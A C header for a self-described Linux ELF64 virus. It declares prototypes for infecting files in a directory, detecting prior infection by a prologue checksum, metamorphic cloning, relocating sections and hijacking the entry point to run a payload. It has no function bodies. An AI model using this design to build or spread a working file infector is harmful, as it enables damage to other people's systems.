#ifndef VIRUS_H
# define VIRUS_H

# include <fcntl.h>
# include <linux/elf.h>
# include <stdbool.h>
# include <stdint.h>
# include <sys/types.h>
# include <unistd.h>

# include "virus_header.h"
# include "accessors.h"

/*
** virus infection detection mechanism
** hardcoded checksum of the unordered (because permutated) push of
** all registers and flags at the beginning of the loader code
*/

# define LOADER_PROLOGUE_LEN	23
# define LOADER_PROLOGUE_SUM	0x733

/*
** entry point related informations
*/
struct entry
{
	struct elf64_phdr	*safe_phdr;     // program header to adjust
	struct elf64_shdr	*safe_shdr;     // section header to adjust
	size_t			entry_offset;   // entry point offset in file
	size_t			entry_addr;     // entry point virtual address
	size_t			payload_offset; // payload offset in file
	size_t			payload_addr;   // payload virtual address
};

/*
** virus entry point and start routines
*/

void		virus(const struct virus_header *vhdr);
void		infect_files_in(const struct virus_header *vhdr, const char *root_dir);
bool		infect(const struct virus_header *vhdr, const char *file);
bool		infection_engine(struct virus_header *vhdr, struct safe_ptr file_ref, struct safe_ptr clone_ref, size_t *shift_amount);

bool		create_text_and_write();

/*
** infection engine routines
*/

bool		find_entry(struct entry *entry, struct safe_ptr ref);
bool		not_infected(const struct entry *file_entry, struct safe_ptr file_ref);
bool		copy_virus_to_clone(struct safe_ptr clone_ref, size_t payload_offset, const struct virus_header *vhdr);
bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset, size_t *full_virus_size, const struct virus_header *vhdr);
bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t payload_offset, size_t shift_amount);
bool		adjust_references(struct safe_ptr clone_ref, struct entry clone_entry, size_t shift_amount);
bool		setup_virus_header(struct safe_ptr clone_ref, size_t loader_offset, struct virus_header vhdr);
bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, size_t dist_jmpclient_loader);

/*
** elf iterators
*/

typedef bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);

bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);
bool		foreach_shdr_entry(struct safe_ptr ref, size_t offset, f_iter_callback callback, void *data);

#endif
